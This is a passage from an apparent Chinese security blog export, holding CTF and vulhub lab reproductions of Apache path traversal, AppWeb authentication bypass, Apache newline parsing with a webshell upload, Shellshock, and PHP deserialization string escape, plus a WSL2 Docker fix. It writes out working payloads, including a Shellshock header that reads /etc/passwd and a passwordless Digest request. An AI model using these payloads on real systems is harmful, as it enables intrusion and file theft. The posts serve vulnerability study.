<p>编写如下测试代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">Array</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> Test2;</span><br><span class="line">print_r(serialize(<span class="variable">$test1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">print_r(serialize(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;&#125;  </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，如果需要在序列化中提交数组，需要注意这一点，不仅需要闭合双引号，还要把<code>&#123;&#125;</code>也给闭合了。</p>
<p>例题：<a href="0CTF%202016%20piapiapia.md">0CTF 2016
piapiapia</a></p>
<h1 id="序列化后的属性顺序">7 序列化后的属性顺序</h1>
<p>编写代码测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果将属性颠倒一下，其余不变 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>得到的结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>结论</strong>：从以上实验可以看出，编写类的时候属性的先后顺序就是序列化后字符串中属性的先后顺序。</p>
<p>例题：<a href="0CTF%202016%20piapiapia.md">0CTF 2016
piapiapia</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>wsl2中docker无法启动的问题</title>
    <url>/2022/11/27/wsl2%E4%B8%ADdocker%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="问题">1. 问题</h1>
<p>WSL2 支持两种 docker 安装，参考连接：<a
href="https://zhuanlan.zhihu.com/p/148511634">win10利用WSL2安装docker的2种方式
- 知乎</a></p>
<ol type="1">
<li>第一种：官方推荐，使用
<code>docker for desktop</code>，个人不喜欢，还需要安装一个软件；</li>
<li>第二种：与原生 Linux 一样，需要注意，wsl 无法使用
<code>systemctl</code>；</li>
</ol>
<p>使用第二种方式安装之后，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<p>启动 docker，但输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker status</span><br></pre></td></tr></table></figure>
<p>虽然没有报错，且查看 docker
状态的时候，发现成功启动，但再一次查看的时候，发现并没有启动，并且之后一直都无法启动，输入如下命令查看日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/docker.log</span><br></pre></td></tr></table></figure>
<p>在日志中发现：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221127092523.png" /></p>
<p>原因是由于新的 ubuntu 使用了 iptables-nft，而 WSL2 不支持导致的。</p>
<h1 id="解决">2. 解决</h1>
<p>参考：<a
href="https://blog.csdn.net/0210/article/details/124349371">Docker无法在WSL2的Ubuntu启动的问题_世宝宝的博客-CSDN博客</a></p>
<ol type="1">
<li>输入 <code>update-alternatives --config iptables</code></li>
<li>输入 1，选择 <code>/usr/sbin/iptables-legacy</code></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221127092713.png" /></p>
<p>然后再启动 docker 发现可以正常运行：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221127092728.png" /></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>wsl2</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>wsl2</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache HTTP
Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
<ul>
<li><p>版本等于2.4.49</p></li>
<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
</ul>
<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
</ul>
<p>运行漏洞环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>进入环境，显示如下则环境搭建成功。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
<p>成功得到文件的内容，因此证明存在此漏洞。</p>
<p>需要注意的是，<code>icons</code>
需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的
url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
<p>接下来改变请求的方式，发送如下请求：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
<p>成功执行命令。</p>
<h1 id="总结">总结</h1>
<p>今天刷的一套题就是类似的路径穿越漏洞（<a
href="https://buuoj.cn/challenges">BUUCTF</a> 中的
<strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>AppWeb是Embedthis Software
LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web
Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web
Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest
改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>参考链接：</p>
<ul>
<li><a
href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
</ul>
<p>启动环境：</p>
<ul>
<li><code>sudo docker-compose up -d</code></li>
<li>输入 <code>http://ip:8080</code> 即可访问</li>
</ul>
<p>前提：</p>
<ul>
<li>已知某个用户名为 <code>admin</code></li>
</ul>
<h1 id="复现">复现</h1>
<p>直接访问环境发现需要登录 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
<p>如果随便输入用户名和密码则会显示 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
<p>输入用户名 <code>admin</code> 然后抓包，修改为如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>（最后两个空行很重要！）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
<ul>
<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
</ul>
<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
<p>成功登录 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>AppWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache
HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>上传一个木马，发现被拦截： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
<p>此时修改 24
行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击
<code>apply changes</code> 。此时就加入了一个换行符 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
<p>然后再次发送该数据包，此时成功发送。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
<p>访问
<code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
<p>利用蚁剑连接 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
<p>成功获得 webshell。</p>
<h1 id="总结">总结</h1>
<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是
<code>php%0a</code> 并不是 <code>php</code>
文件，不会被执行，这就证明了存在解析漏洞。</p>
<h1 id="资源">资源</h1>
<ol type="1">
<li><a
href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
<li><a
href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
<p>参考链接： -
https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
<p>影响版本： - bash version &lt;= 4.3</p>
<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
<p>启动环境： - <code>sudo docker-compose up -d</code> -
输入 <code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>破壳漏洞</tag>
        <tag>shellshock</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_serialize_php</title>
    <url>/2022/04/09/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5B安洵杯%202019%5Deasy_serialize_php">easy_serialize_php</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入之后，点击<code>source_code</code>，出现如下源码：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<p>经过提示，先<code>?f=phpinfo</code>查看一下有什么信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409200107.png" /></p>
<p>想必这个文件肯定与flag有关。</p>
<h1 id="解题">解题</h1>
<p>从代码来看，我们应该需要通过<code>echo file_get_contents(base64_decode($userinfo['img']));</code>读取flag，那么<code>f</code>的值就是<code>show_image</code>。</p>
<p>现在就是如何让<code>_SESSION['img']=flag文件</code>。如果传入<code>img_path</code>参数，那么就会经过<code>sha1()</code>，即使我们输入的是flag文件名，也会变成hash值从而无法读取。所以我们不能传入<code>img_path</code>。那么此时的<code>_SESSION['img']=guest_img.png</code>。</p>
<p>那需要怎么做才能将值变成我们想要的值呢？这里就涉及到了<strong>反序列化字符串逃逸</strong>。</p>
<p>先介绍以下<code>extract()</code>函数，这个函数会导致变量覆盖漏洞，这也是本题的考点之一。正常情况下：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>但是如果我们通过该函数，POST方式传入如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[function]=flag</span><br></pre></td></tr></table></figure></p>
<p>那么此时变量就会被覆盖： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="反序列化字符串逃逸">反序列化字符串逃逸</h2>
<p>其实有两种情况，本题涉及到的是<strong>字符串变少</strong>的情况。</p>
<p>正常情况下情况： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;guest_img.png&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;guest_img.png&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的字符串也能够通过反序列化转为数组：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409202554.png" /></p>
<p>设想如下的字符串能否通过反序列化转为数组？如果可以，数组的值为什么？
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409202910.png" /></p>
<p>虽然字符串中<code>s:4:"user";s:33:"";</code>33后面的双引号中应该存在33个字符，才满足序列化的规律。查看结果发现，<code>function</code>这个键不见了，而多了一个<code>hdf</code>的键。</p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;</span><br><span class="line"></span><br><span class="line">从33后的第一个双引号之后取33个字符：&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image，这33个字符正好被一对双引号包括，因此，系统会认为这就是user的值。然后后面的s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;正好也满足序列h规律，因为这个数组有3个值，所以s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;也成为了数组的键值。</span><br></pre></td></tr></table></figure></p>
<p>所以这个字符串还是满足序列化的特征的，只不过利用某种办法让原来的user的33个字符消失了，从而将后面的字符串（我们注入的字符串）当作原来数组中的数据。从而实现了逃逸。</p>
<p>需要注意的是 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;1341414141412412412</span><br></pre></td></tr></table></figure></p>
